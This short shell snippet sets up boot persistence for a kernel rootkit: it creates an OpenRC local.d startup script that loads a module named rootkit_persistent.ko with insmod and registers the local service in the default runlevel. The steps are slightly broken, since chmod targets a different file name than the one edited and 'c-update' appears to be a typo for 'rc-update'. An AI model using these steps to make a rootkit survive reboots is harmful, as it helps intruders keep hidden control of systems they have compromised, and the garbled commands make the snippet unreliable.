vi /etc/local.d/my_startup.start

#!/bin/sh

#Loads the kernel module located at /opt/mymodules/rootkit_persistent.ko
insmod /opt/mymodules/rootkit_persistent.ko

chmod +x /etc/local.d/rootkit.start

#Adds the local service to the default runlevel
c-update add local default